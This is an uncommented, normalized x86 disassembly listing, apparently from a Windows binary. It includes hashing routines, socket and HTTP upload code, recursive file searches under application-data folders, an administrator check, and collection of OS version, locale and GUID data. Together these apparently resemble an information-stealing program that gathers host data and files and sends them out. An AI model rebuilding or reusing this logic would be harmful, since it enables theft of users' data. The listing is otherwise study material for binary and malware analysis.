lea ebx [ edi + ebx - 0x7a7ba22f ]
add ebx [ esi + 0x4 ]
rol ebx 0x15
add ebx ecx
mov edi 0xffffffff
xor edi edx
or edi ebx
xor edi ecx
lea eax [ edi + eax + 0x6fa87e4f ]
add eax [ esi + 0x20 ]
rol eax 0x6
add eax ebx
mov edi 0xffffffff
xor edi ecx
or edi eax
xor edi ebx
lea edx [ edi + edx - 0x1d31920 ]
add edx [ esi + 0x3c ]
rol edx 0xa
add edx eax
mov edi 0xffffffff
xor edi ebx
or edi edx
xor edi eax
lea ecx [ edi + ecx - 0x5cfebcec ]
add ecx [ esi + 0x18 ]
rol ecx 0xf
add ecx edx
mov edi 0xffffffff
xor edi eax
or edi ecx
xor edi edx
lea ebx [ edi + ebx + 0x4e0811a1 ]
add ebx [ esi + 0x34 ]
rol ebx 0x15
add ebx ecx
mov edi 0xffffffff
xor edi edx
or edi ebx
xor edi ecx
lea eax [ edi + eax - 0x8ac817e ]
add eax [ esi + 0x10 ]
rol eax 0x6
add eax ebx
mov edi 0xffffffff
xor edi ecx
or edi eax
xor edi ebx
lea edx [ edi + edx - 0x42c50dcb ]
add edx [ esi + 0x2c ]
rol edx 0xa
add edx eax
mov edi 0xffffffff
xor edi ebx
or edi edx
xor edi eax
lea ecx [ edi + ecx + 0x2ad7d2bb ]
add ecx [ esi + 0x8 ]
rol ecx 0xf
add ecx edx
mov edi 0xffffffff
xor edi eax
or edi ecx
xor edi edx
lea ebx [ edi + ebx - 0x14792c6f ]
add ebx [ esi + 0x24 ]
rol ebx 0x15
add ebx ecx
mov edi [ ebp + 0x8 ]
add [ edi ] eax
add [ edi + 0x4 ] ebx
add [ edi + 0x8 ] ecx
add [ edi + 0xc ] edx
dec [ ebp - 0x4 ]
lea esi [ esi + 0x40 ]
jns r-xdata
pop edx
pop ecx
pop ebx
pop eax
pop edi
pop esi
leave
retn 0xc
sub_40348d
push ebp
mov ebp esp
add esp 0xfffffff8
push edi
push esi
push ebx
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
pop [ ebp - 0x8 ]
mov [ rw-data ] 0x67452301
mov [ rw-data ] 0xefcdab89
mov [ rw-data ] 0x98badcfe
mov [ rw-data ] 0x10325476
mov [ rw-data ] 0xc3d2e1f0
jmp r-xdata
sub [ ebp - 0x8 ] 0x40
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
push 0x40
push rw-data
push eax
call sub_401883
add [ ebp - 0x4 ] 0x40
call sub_4035bf
mov ebx [ ebp - 0x8 ]
add ebx 0x40
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
push ebx
push rw-data
push eax
call sub_401883
add [ ebp - 0x4 ] ebx
mov [ ebx + rw-data ] 0x80
sub ebx 0x37
jbe r-xdata
je r-xdata
sub ebx 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx 0x8
xor edx edx
mul ecx
bswap eax
bswap edx
mov [ rw-data ] eax
mov [ rw-data ] edx
call sub_4035bf
mov eax [ rw-data ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
bswap eax
bswap edx
bswap ecx
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ rw-data ] ecx
mov eax [ rw-data ]
mov edx [ rw-data ]
bswap eax
bswap edx
mov [ rw-data ] eax
mov [ rw-data ] edx
push 0x14
push [ ebp + 0x10 ]
push rw-data
call sub_401883
pop ebx
pop esi
pop edi
leave
retn 0xc
and [ ebx + rw-data ] 0x0
inc ebx
js r-xdata
call sub_4035bf
mov ebx 0xffffffc8
jmp r-xdata
and [ ebx + rw-data ] 0x0
inc ebx
js r-xdata
sub_4035bf
push ebp
mov ebp esp
add esp 0xfffffff8
mov ecx 0xfffffff8
mov eax [ ecx * 8 + rw-data ]
mov edx [ ecx * 8 + rw-data ]
bswap eax
bswap edx
mov [ ecx * 8 + rw-data ] eax
mov [ ecx * 8 + rw-data ] edx
inc ecx
jne r-xdata
mov ecx 0xffffffc0
mov eax [ ecx * 4 + rw-data ]
mov edx [ ecx * 4 + rw-data ]
xor eax [ ecx * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
xor eax edx
rol eax 0x1
mov [ ecx * 4 + rw-data ] eax
inc ecx
jne r-xdata
mov ebx [ rw-data ]
mov esi [ rw-data ]
mov edi [ rw-data ]
push [ rw-data ]
pop [ ebp - 0x4 ]
push [ rw-data ]
pop [ ebp - 0x8 ]
mov ecx 0xffffffec
mov edx esi
mov eax edi
not edx
and eax esi
and edx [ ebp - 0x4 ]
or eax edx
add eax [ ecx * 4 + rw-data ]
add eax [ ebp - 0x8 ]
add eax 0x5a827999
push [ ebp - 0x4 ]
pop [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edi
rol esi 0x1e
mov edi esi
mov esi ebx
rol ebx 0x5
add ebx eax
inc ecx
jne r-xdata
mov ecx 0xffffffec
mov eax esi
mov edx edi
xor eax [ ebp - 0x4 ]
xor eax edx
add eax [ ecx * 4 + rw-data ]
add eax [ ebp - 0x8 ]
add eax 0x6ed9eba1
push [ ebp - 0x4 ]
pop [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edi
rol esi 0x1e
mov edi esi
mov esi ebx
rol ebx 0x5
add ebx eax
inc ecx
jne r-xdata
mov ecx 0xffffffec
mov eax edi
mov edx [ ebp - 0x4 ]
or eax [ ebp - 0x4 ]
and edx edi
and eax esi
or eax edx
add eax [ ecx * 4 + rw-data ]
add eax [ ebp - 0x8 ]
add eax 0x8f1bbcdc
push [ ebp - 0x4 ]
pop [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edi
rol esi 0x1e
mov edi esi
mov esi ebx
rol ebx 0x5
add ebx eax
inc ecx
jne r-xdata
mov ecx 0xffffffec
mov eax esi
mov edx edi
xor eax [ ebp - 0x4 ]
xor eax edx
add eax [ ecx * 4 + rw-data ]
add eax [ ebp - 0x8 ]
add eax 0xca62c1d6
push [ ebp - 0x4 ]
pop [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edi
rol esi 0x1e
mov edi esi
mov esi ebx
rol ebx 0x5
add ebx eax
inc ecx
jne r-xdata
add [ rw-data ] ebx
add [ rw-data ] esi
add [ rw-data ] edi
mov eax [ ebp - 0x4 ]
add [ rw-data ] eax
mov eax [ ebp - 0x8 ]
add [ rw-data ] eax
leave
retn
sub_403743
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call inet_addr
cmp eax 0xffffffff
jne r-xdata
leave
retn 0x4
push [ ebp + 0x8 ]
call gethostbyname
or eax eax
jne r-xdata
mov eax [ eax + 0xc ]
nop
or eax eax
jne r-xdata
mov eax 0xffffffff
jmp r-xdata
mov eax [ eax ]
mov eax [ eax ]
mov eax 0xffffffff
jmp r-xdata
sub_40377d
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
push 0x6
push 0x1
push 0x2
call socket
cmp eax 0xffffffff
jne r-xdata
mov ebx eax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
call sub_401863
mov [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x10 ]
xchg ch cl
mov [ ebp - 0xe ] cx
cmp [ ebp + 0xc ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
mov eax ebx
pop ebx
leave
retn 0xc
push [ ebp + 0x8 ]
call sub_403743
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0xc ] eax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push ebx
call connect
cmp eax 0xffffffff
jne r-xdata
jmp r-xdata
jmp r-xdata
push ebx
call closesocket
xor ebx ebx
sub_403801
push ebp
mov ebp esp
push ebx
push edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edi [ ebp + 0xc ]
mov ebx 0x0
mov eax 0x1
pop edi
pop ebx
leave
retn 0xc
mov eax ebx
pop edi
pop ebx
leave
retn 0xc
add edi eax
sub [ ebp + 0x10 ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov ebx 0x1
jmp r-xdata
push 0x0
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call send
test eax eax
jle r-xdata
sub_40384d
push ebp
mov ebp esp
add esp 0xfffffef4
push [ ebp + 0xc ]
pop [ ebp - 0x10c ]
mov [ ebp - 0x108 ] 0x0
mov [ ebp - 0x104 ] 0x1
lea eax [ ebp - 0x100 ]
push [ ebp + 0x8 ]
pop [ eax ]
lea eax [ ebp - 0x10c ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x104 ]
push eax
push 0x0
call select
cmp eax 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
or eax eax
jne r-xdata
leave
retn 0x8
mov eax 0x1
sub_4038ad
push ebp
mov ebp esp
add esp 0xfffffffc
push ebx
sub ebx ebx
push 0x5a
push [ ebp + 0x8 ]
call sub_40384d
or eax eax
je r-xdata
mov eax ebx
pop ebx
leave
retn 0x14
push 0x5a
push [ ebp + 0x8 ]
call sub_40384d
or eax eax
jne r-xdata
push 0x0
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push [ ebp + 0x8 ]
call recv
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp [ ebp - 0x1 ] al
jne r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
push 0x0
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push [ ebp + 0xc ]
call [ edx + 0x10 ]
push [ ebp + 0xc ]
call sub_401082
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov bl 0x1
test ebx ebx
je r-xdata
jmp r-xdata
sub_40391f
push ebp
mov ebp esp
add esp 0xfffff800
push ebx
sub ebx ebx
push 0x5a
push [ ebp + 0x8 ]
call sub_40384d
or eax eax
je r-xdata
mov eax ebx
pop ebx
leave
retn 0xc
push 0x5a
push [ ebp + 0x8 ]
call sub_40384d
or eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x800
jbe r-xdata
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov eax 0x800
jmp r-xdata
jne r-xdata
jmp r-xdata
push 0x0
push eax
lea eax [ ebp - 0x800 ]
push eax
push [ ebp + 0x8 ]
call recv
test eax eax
jns r-xdata
push eax
mov edx [ ebp + 0xc ]
mov edx [ edx ]
push 0x0
push eax
lea eax [ ebp - 0x800 ]
push eax
push [ ebp + 0xc ]
call [ edx + 0x10 ]
pop eax
sub [ ebp + 0x10 ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
inc ebx
jmp r-xdata
test ebx ebx
je r-xdata
inc ebx
jmp r-xdata
sub_4039a7
push ebp
mov ebp esp
add esp 0xfffffff8
push edi
xor edi edi
mov eax edi
add eax 0x3
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
push edi
push [ ebp + 0x8 ]
call sub_401047
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
lea eax [ ebp - 0x8 ]
push eax
push 0x4
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call [ edx + 0xc ]
inc edi
cmp [ ebp - 0x4 ] 0xa0d0a0d
je r-xdata
xor eax eax
jmp r-xdata
pop edi
leave
retn 0x4
sub_4039f5
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push edi
push 0x3a98
call sub_40184c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_401000
xor ebx ebx
mov edx [ ebp - 0xc ]
mov edx [ edx ]
push [ ebp - 0xc ]
call [ edx + 0x8 ]
push [ ebp - 0x4 ]
call sub_401835
mov eax ebx
pop edi
pop ebx
leave
retn 0xc
push [ ebp - 0xc ]
call sub_401082
cmp eax 0xfa00
jbe r-xdata
push [ ebp - 0xc ]
call sub_4039a7
test eax eax
je r-xdata
jmp r-xdata
push 0x1e
push 0xa
push 0xfa00
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_4038ad
test eax eax
je r-xdata
push [ ebp - 0xc ]
call sub_4012bb
mov edx [ ebp - 0xc ]
mov edx [ edx ]
push 0x0
push 0x2134
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp - 0x4 ]
call StrStrIA
push ebx
or eax eax
je r-xdata
pop ebx
push rw-data
push [ ebp - 0x4 ]
call StrStrIA
push ebx
or eax eax
je r-xdata
mov edi eax
push rw-data
call lstrlenA
add edi eax
push edi
inc edi
mov ebx edi
mov ecx 0x1194
mov al 0xd
[ edi ]
mov eax 0x1194
sub eax ecx
mov [ edi - 0x1 ] 0x0
push edi
push ebx
call StrToIntA
mov [ ebp - 0x8 ] eax
pop edi
mov [ edi - 0x1 ] 0xd
pop edi
pop ebx
push [ ebp - 0xc ]
call sub_40131f
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
mov edi eax
push rw-data
call lstrlenA
add edi eax
push edi
inc edi
mov ebx edi
mov ecx 0x1194
mov al 0xd
[ edi ]
mov eax 0x1194
sub eax ecx
mov [ edi - 0x1 ] 0x0
push edi
push ebx
call sub_40299a
mov edx [ ebp + 0x10 ]
or edx edx
je r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_40391f
push [ ebp - 0xc ]
call sub_401082
or eax eax
jne r-xdata
mov [ ebp - 0x8 ] 0xa00000
push eax
call sub_401835
mov [ edx ] eax
jmp r-xdata
or eax eax
je r-xdata
jmp r-xdata
pop edi
mov [ edi - 0x1 ] 0xd
pop edi
mov edx [ ebp - 0xc ]
mov edx [ edx ]
push [ ebp + 0xc ]
push [ ebp - 0xc ]
call [ edx + 0x34 ]
test eax eax
js r-xdata
mov ebx 0x1
sub_403b7c
push ebp
mov ebp esp
add esp 0xfffffffc
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x2 ] 0x1e
push 0x4
lea eax [ ebp - 0x4 ]
push eax
push 0x80
push 0xffff
push [ ebp + 0x8 ]
call setsockopt
leave
retn 0x4
sub_403baa
push ebp
mov ebp esp
add esp 0xffffffac
push edi
push ebx
mov [ ebp - 0x54 ] 0x0
xor ebx ebx
push 0x1000
call sub_40184c
mov [ ebp - 0x40 ] eax
push 0x1000
call sub_40184c
mov [ ebp - 0x48 ] eax
push 0x1000
call sub_40184c
mov [ ebp - 0x44 ] eax
lea edi [ ebp - 0x3c ]
mov ecx 0x3c
xor eax eax
[ edi ]
mov [ ebp - 0x3c ] 0x3c
push [ ebp - 0x40 ]
pop [ ebp - 0x2c ]
push [ ebp - 0x48 ]
pop [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0xfff
mov [ ebp - 0xc ] 0xfff
lea eax [ ebp - 0x3c ]
push eax
push 0x80000000
push 0x0
push [ ebp + 0x8 ]
call InternetCrackUrlA
or eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
push [ ebp - 0x40 ]
call sub_401835
push [ ebp - 0x44 ]
call sub_401835
push [ ebp - 0x48 ]
call sub_401835
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov [ ebp - 0x50 ] 0xfff
lea eax [ ebp - 0x50 ]
push eax
push [ ebp - 0x44 ]
push 0x80000000
lea eax [ ebp - 0x3c ]
push eax
call InternetCreateUrlA
or eax eax
jne r-xdata
mov eax ebx
pop ebx
pop edi
leave
retn 0x10
push [ ebp - 0x54 ]
call sub_401835
mov eax [ ebp - 0x48 ]
mov [ eax ] 0x0
lea edi [ ebp - 0x3c ]
mov ecx 0x3c
xor eax eax
[ edi ]
mov [ ebp - 0x3c ] 0x3c
push [ ebp - 0x48 ]
pop [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0xfff
mov [ ebp - 0xc ] 0xfff
lea eax [ ebp - 0x3c ]
push eax
push 0x0
push 0x0
push [ ebp - 0x44 ]
call InternetCrackUrlA
or eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x40 ]
push [ ebp - 0x48 ]
push rw-data
push [ ebp - 0x44 ]
call wsprintfA
add esp 0x14
movzx eax [ ebp - 0x24 ]
push eax
push 0x0
push [ ebp - 0x40 ]
call sub_40377d
or eax eax
jne r-xdata
mov [ ebp - 0x4c ] eax
push [ ebp - 0x4c ]
call sub_403b7c
push [ ebp - 0x44 ]
call lstrlenA
push eax
push [ ebp - 0x44 ]
push [ ebp - 0x4c ]
call sub_403801
or eax eax
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov ebx eax
or ebx ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x4c ]
call sub_403801
or eax eax
jne r-xdata
push [ ebp - 0x4c ]
call closesocket
lea eax [ ebp - 0x54 ]
push eax
push [ ebp + 0x14 ]
push [ ebp - 0x4c ]
call sub_4039f5
mov ebx eax
jmp r-xdata
sub_403d5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
sub ebx ebx
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax ebx
pop ebx
leave
retn 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
call GetHGlobalFromStream
test eax eax
js r-xdata
push [ ebp + 0xc ]
call sub_40129a
push [ ebp + 0xc ]
call sub_401082
mov [ ebp - 0x8 ] eax
push [ ebp - 0x4 ]
call GlobalLock
or eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_403baa
mov ebx eax
push [ ebp - 0x4 ]
call GlobalUnlock
sub_403ddc
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
leave
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40151c
sub_403e08
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
leave
retn 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401548
sub_403e31
push ebp
mov ebp esp
add esp 0xfffffff0
push [ ebp + 0xc ]
call sub_401f36
mov [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
leave
retn 0xc
push [ ebp + 0xc ]
call sub_401eb3
or eax eax
je r-xdata
push [ ebp + 0xc ]
call sub_401835
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_401f7a
or eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x100000
jae r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_402325
or eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_403ddc
sub_403ea2
push ebp
mov ebp esp
add esp 0xfffffff0
push [ ebp + 0xc ]
call sub_401f36
mov [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
leave
retn 0xc
push [ ebp + 0xc ]
call sub_401eb3
or eax eax
je r-xdata
push [ ebp + 0xc ]
call sub_401835
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_401f7a
or eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x100000
jae r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_403ddc
sub_403f04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
sub ebx ebx
push [ ebp + 0x8 ]
call sub_401f36
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax ebx
pop ebx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_401eb3
or eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_401835
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_401f7a
or eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x100000
jae r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_402325
or eax eax
je r-xdata
inc ebx
sub_403f6b
push ebp
mov ebp esp
add esp 0xfffffeb4
mov [ ebp - 0x148 ] 0x0
mov eax [ ebp + 0xc ]
or eax eax
je r-xdata
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x148 ]
call sub_401835
leave
retn 0x14
push [ ebp + 0xc ]
call sub_402526
or eax eax
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push rw-data
push [ ebp + 0xc ]
call sub_401d75
jmp r-xdata
lea edx [ ebp - 0x13e ]
test [ edx ] 0x10
je r-xdata
mov [ ebp - 0x148 ] eax
push 0x13e
lea eax [ ebp - 0x13e ]
push eax
call sub_401863
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x148 ]
call FindFirstFileA
mov [ ebp - 0x144 ] eax
inc eax
je r-xdata
lea eax [ edx + 0x2c ]
mov [ ebp - 0x14c ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x14c ]
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x144 ]
call FindNextFileA
test eax eax
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push [ ebp - 0x14c ]
push eax
call sub_401dc9
push eax
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0xc ]
call sub_402526
or eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0x144 ]
call FindClose
push [ ebp + 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_403e31
push [ ebp + 0x14 ]
push eax
push [ ebp + 0x8 ]
call [ ebp + 0x18 ]
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
call sub_401d75
push rw-data
push [ ebp + 0xc ]
call sub_401d75
jmp r-xdata
call sub_401835
lea edx [ ebp - 0x13e ]
lea edx [ edx + 0x2c ]
push edx
push eax
call sub_401dc9
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_403f6b
call sub_401835
jmp r-xdata
sub_404130
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x14
push [ ebp + 0x10 ]
push eax
call sub_401dc9
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_404161
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1a
push [ ebp + 0x8 ]
call sub_404130
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x23
push [ ebp + 0x8 ]
call sub_404130
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1c
push [ ebp + 0x8 ]
call sub_404130
leave
retn 0x10
sub_4041a1
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
sub ebx ebx
mov eax [ ebp + 0xc ]
push [ eax ]
pop [ ebp - 0x8 ]
push [ ebp + 0x8 ]
pop [ ebp - 0x4 ]
mov [ ebp - 0xc ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
leave
retn 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
push 0x0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
call [ rw-data ]
or eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax ]
ja r-xdata
push [ ebp - 0xc ]
call LocalFree
inc ebx
cld
mov esi [ ebp - 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
jecxz r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x10 ]
pop [ eax ]
[ edi ] [ esi ]
sub_40422f
push ebp
mov ebp esp
add esp 0xfffffffc
push ebx
push esi
push edi
push rw-data
call GetModuleHandleA
mov ebx eax
mov [ ebp - 0x4 ] 0x0
or eax eax
je r-xdata
mov eax 0x0
pop edi
pop esi
pop ebx
leave
retn
push rw-data
push ebx
call GetProcAddress
or eax eax
je r-xdata
mov esi eax
push rw-data
push ebx
call GetProcAddress
or eax eax
je r-xdata
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcess
push eax
call edi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
leave
retn
sub_404297
push ebp
mov ebp esp
add esp 0xfffffff0
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
leave
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x6 ]
mov [ eax ] 0x0
mov [ eax + 0x1 ] 0x0
mov [ eax + 0x2 ] 0x0
mov [ eax + 0x3 ] 0x0
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x5 ] 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0x6 ]
push eax
call [ rw-data ]
or eax eax
jne r-xdata
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0xc ]
push 0x0
call [ rw-data ]
or eax eax
jne r-xdata
leave
retn
push [ ebp - 0xc ]
call [ rw-data ]
mov eax [ ebp - 0x10 ]
leave
retn
mov [ ebp - 0x10 ] 0x0
sub_404331
push ebp
mov ebp esp
add esp 0xffffff88
lea eax [ ebp - 0x78 ]
push eax
push rw-data
call sub_402774
push eax
or eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call CoCreateGuid
test eax eax
js r-xdata
cmp [ ebp - 0x78 ] 0x14
ja r-xdata
call sub_401835
leave
retn
movzx eax [ ebp - 0x1 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
movzx eax [ ebp - 0x3 ]
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x7 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push rw-data
lea eax [ ebp - 0x74 ]
push eax
call wsprintfA
add esp 0x34
lea eax [ ebp - 0x74 ]
push eax
call lstrlenA
push eax
lea eax [ ebp - 0x74 ]
push eax
push rw-data
call sub_40265a
sub_4043c2
push ebp
mov ebp esp
add esp 0xffffff2c
push ebx
push edi
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0001
push [ ebp + 0x8 ]
call sub_4014e6
push 0x9c
lea eax [ ebp - 0xa0 ]
push eax
call sub_401863
mov [ ebp - 0xa0 ] 0x9c
lea eax [ ebp - 0xa0 ]
push eax
call GetVersionExA
sub ecx ecx
sub edx edx
lea edi [ ebp - 0x8c ]
jmp r-xdata
cmp ecx 0x80
jb r-xdata
cmp [ edi ] 0x0
jne r-xdata
or eax eax
je r-xdata
or edx edx
je r-xdata
mov edx 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40151c
push 0x9c
lea eax [ ebp - 0xa0 ]
push eax
push [ ebp + 0x8 ]
call sub_40151c
jmp r-xdata
inc edi
inc ecx
mov [ edi ] 0x0
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40151c
cmp [ ebp - 0xa8 ] 0x14
jb r-xdata
call sub_40422f
push eax
push [ ebp + 0x8 ]
call sub_4014e6
push 0x400
call sub_40184c
mov [ ebp - 0xa4 ] eax
push 0x3ff
push [ ebp - 0xa4 ]
push 0x1002
push 0x400
call GetLocaleInfoA
push eax
push [ ebp - 0xa4 ]
push [ ebp + 0x8 ]
call sub_40151c
push 0x3ff
push [ ebp - 0xa4 ]
push 0x1001
push 0x400
call GetLocaleInfoA
push eax
push [ ebp - 0xa4 ]
push [ ebp + 0x8 ]
call sub_40151c
call sub_404297
push eax
push [ ebp + 0x8 ]
call sub_4014e6
call sub_404331
lea eax [ ebp - 0xa8 ]
push eax
push rw-data
call sub_402774
mov [ ebp - 0xac ] eax
cmp [ ebp - 0xac ] 0x0
je r-xdata
or ebx ebx
jne r-xdata
push rw-data
push [ ebp - 0xd4 ]
